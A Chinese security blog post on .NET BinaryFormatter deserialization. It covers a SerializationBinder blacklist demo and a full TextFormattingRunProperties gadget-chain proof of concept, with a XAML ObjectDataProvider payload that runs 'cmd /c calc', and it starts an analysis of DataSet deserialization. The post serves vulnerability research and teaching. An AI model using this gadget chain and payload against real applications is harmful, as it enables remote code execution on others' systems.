<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Dotnet-Deserialization-03 | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;boogipop.com&#x2F;2024&#x2F;02&#x2F;07&#x2F;%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003&#x2F; https:&#x2F;&#x2F;github.com&#x2F;Y4er&#x2F;dotnet-deserialization&#x2F;blob&#x2F;main&#x2F;BinaryFormatter.md">
<meta property="og:type" content="article">
<meta property="og:title" content="Dotnet-Deserialization-03">
<meta property="og:url" content="https://ke1nys.github.io/posts/4af57b1b.html">
<meta property="og:site_name" content="ke1nys&#96;Blog">
<meta property="og:description" content="https:&#x2F;&#x2F;boogipop.com&#x2F;2024&#x2F;02&#x2F;07&#x2F;%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003&#x2F; https:&#x2F;&#x2F;github.com&#x2F;Y4er&#x2F;dotnet-deserialization&#x2F;blob&#x2F;main&#x2F;BinaryFormatter.md">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
<meta property="article:published_time" content="2024-02-25T09:24:49.000Z">
<meta property="article:modified_time" content="2024-03-12T14:41:01.010Z">
<meta property="article:author" content="ke1nys">
<meta property="article:tag" content="dotnet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/4af57b1b"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Dotnet-Deserialization-03',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-12 22:41:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Dotnet-Deserialization-03</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-25T09:24:49.000Z" title="发表于 2024-02-25 17:24:49">2024-02-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-12T14:41:01.010Z" title="更新于 2024-03-12 22:41:01">2024-03-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Dotnet-Deserialization-03"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/">https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md</a></p>
<p>这一篇文章主要讲的是这个BinaryFormatter</p>
<h2 id="BinaryFormatter"><a href="#BinaryFormatter" class="headerlink" title="BinaryFormatter"></a>BinaryFormatter</h2><p>这个类其实我们在Dotnet-Deserialization-01的时候就简略的描述过了    他的一些基本参数我们也讲了  序列化的生命周期也讲了   接下来主要讲的就是这个<code>Binder</code>和<code>SurrogateSelector</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225172852335.png" alt="image-20240225172852335"></p>
<p>Binder就相当于我们java中的<code>resolveclass</code>   可以用来设置反序列化类的黑名单</p>
<p>SurrogateSelector就是代理器  在01的时候也讲了一下</p>
<h2 id="Binder-过滤器"><a href="#Binder-过滤器" class="headerlink" title="Binder 过滤器"></a>Binder 过滤器</h2><p>一个简单的demo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">public class CustomSerializationBinder : SerializationBinder</span><br><span class="line">&#123;</span><br><span class="line">    public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">        if (IsTypeInBlacklist(typeName))</span><br><span class="line">        &#123;</span><br><span class="line">            throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用默认绑定</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private bool IsTypeInBlacklist(string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在这里添加黑名单检查的逻辑</span><br><span class="line">        // 返回 true 表示在黑名单中，返回 false 表示不在黑名单中</span><br><span class="line">        return typeName.Contains(&quot;EvilClass&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[Serializable]</span><br><span class="line">public class EvilClass</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Serializable]</span><br><span class="line">public class MyClass</span><br><span class="line">&#123;</span><br><span class="line">    public string Name &#123; get; set; &#125;</span><br><span class="line">    public int Age &#123; get; set; &#125;</span><br><span class="line">    public object data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">        // 创建对象实例</span><br><span class="line">        MyClass myObject = new MyClass &#123; Name = &quot;John&quot;, Age = 25 &#125;;</span><br><span class="line">        var evilClass = new EvilClass();</span><br><span class="line">        myObject.data = evilClass;</span><br><span class="line"></span><br><span class="line">        // 使用BinaryFormatter进行序列化，并设置自定义的SerializationBinder</span><br><span class="line">        BinaryFormatter formatter = new BinaryFormatter();</span><br><span class="line">        formatter.Binder = new CustomSerializationBinder();</span><br><span class="line"></span><br><span class="line">        using (MemoryStream stream = new MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            formatter.Serialize(stream, myObject);</span><br><span class="line"></span><br><span class="line">            // 将流位置重置为开始</span><br><span class="line">            stream.Seek(0, SeekOrigin.Begin);</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                // 使用BinaryFormatter进行反序列化</span><br><span class="line">                MyClass deserializedObject = (MyClass)formatter.Deserialize(stream);</span><br><span class="line"></span><br><span class="line">                // 输出反序列化后的对象属性</span><br><span class="line">                Console.WriteLine($&quot;Name: &#123;deserializedObject.Name&#125;, Age: &#123;deserializedObject.Age&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (SerializationException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                // 处理反序列化异常</span><br><span class="line">                Console.WriteLine($&quot;Error during deserialization: &#123;ex.Message&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225173905242.png" alt="image-20240225173905242"></p>
<p>匹配到指定的EvilClass这个类   然后就抛出异常</p>
<p>这个过程和Java反序列化中的Resolveclass顺序是一致的，先读取当前类的类型，再读取成员变量的类型，最后还原成对象。</p>
<p>主要的逻辑就是CustomSerializationBinder类中的BindToType方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">&#123;</span><br><span class="line">    // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">    if (IsTypeInBlacklist(typeName))</span><br><span class="line">    &#123;</span><br><span class="line">        throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用默认绑定 </span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(那个SurrogateSelector 代理器这里就不多写了   不了解的可以去看01的那篇文章  有详细的介绍)</p>
<p><strong>简单来说他的作用就是让本不可以序列化的类可以进行序列化</strong></p>
<h2 id="TextFormattingRunProperties利用链"><a href="#TextFormattingRunProperties利用链" class="headerlink" title="TextFormattingRunProperties利用链"></a>TextFormattingRunProperties利用链</h2><p>如果没找到这个类报错的话  我们就得手动导入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225175352997.png" alt="image-20240225175352997"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225175918652.png" alt="image-20240225175918652"></p>
<p>这个类是继承于这个ISerializable接口的   然后因为没有使用代理器  等会序列化的时候就会调用我们的GetObjectData方法  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225180052259.png" alt="image-20240225180052259"></p>
<p>跟进这个方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225180158967.png" alt="image-20240225180158967"></p>
<p>发现了我们的老朋友  XamlReader.Parse  并且这个str可控  那么我们就能完成RCE了  我们只需要给他的<code>ForegroundBrush</code>或者是<code>BackgroundBrush</code>属性赋值为我们Xaml的payload即可完成命令执行</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这个protected的构造函数必须得写  不然会报错  因为在反序列化的时候要调用他</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//在这里设置的TextFormattingRunProperties这个类  因为在序列化的时候优先调用我们自身类的GetObjectData</span></span><br><span class="line">            <span class="comment">//然后再调用TextFormattingRunProperties里面的Get方法</span></span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>xaml的payload就是Dotnet-Deserialization-02给出的payload</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary</span><br><span class="line">    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span></span><br><span class="line">    xmlns:sd=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=System&quot;</span></span><br><span class="line">    xmlns:x=<span class="string">&quot;http://schemas.microsoft</span></span><br><span class="line"><span class="string">.com/winfx/2006/xaml&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider MethodName=<span class="string">&quot;Start&quot;</span> x:Key=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">            &lt;sd:Process&gt;</span><br><span class="line">                &lt;sd:Process.StartInfo&gt;</span><br><span class="line">                    &lt;sd:ProcessStartInfo Arguments=<span class="string">&quot;test&quot;</span> S</span><br><span class="line">tandardErrorEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> StandardOutputEncoding=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> UserName=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> Domain=<span class="string">&quot;&quot;</span> LoadUserProfile=<span class="string">&quot;False&quot;</span> FileName=<span class="string">&quot;calc&quot;</span> /&gt;</span><br><span class="line">                &lt;/sd:Process.StartInfo&gt;</span><br><span class="line">            &lt;/sd:Process&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.ObjectInstance&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225181630669.png" alt="image-20240225181630669"></p>
<p>调用栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure>
<p>流程  </p>
<p>就是我们自己写了个继承于ISerializable接口的类   然后重写了GetObjectData方法   里面对TextFormattingRunProperties类的ForegroundBrush参数进行赋值   </p>
<h2 id="DataSet-Binary二次反序列化"><a href="#DataSet-Binary二次反序列化" class="headerlink" title="DataSet(Binary二次反序列化)"></a>DataSet(Binary二次反序列化)</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225182800448.png" alt="image-20240225182800448"></p>
<p>这个类其实也是实现了ISerializable 接口  也是可以实现像上述TextFormattingRunProperties类的操作  先去看起构造方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225183109294.png" alt="image-20240225183109294"></p>
<p>其构造方法会进入到DeserializeDataSet这个反序列化函数中  跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240225183158408.png" alt="image-20240225183158408"></p>
<p>再跟进DeserializeDataSetSchema函数中去</p>
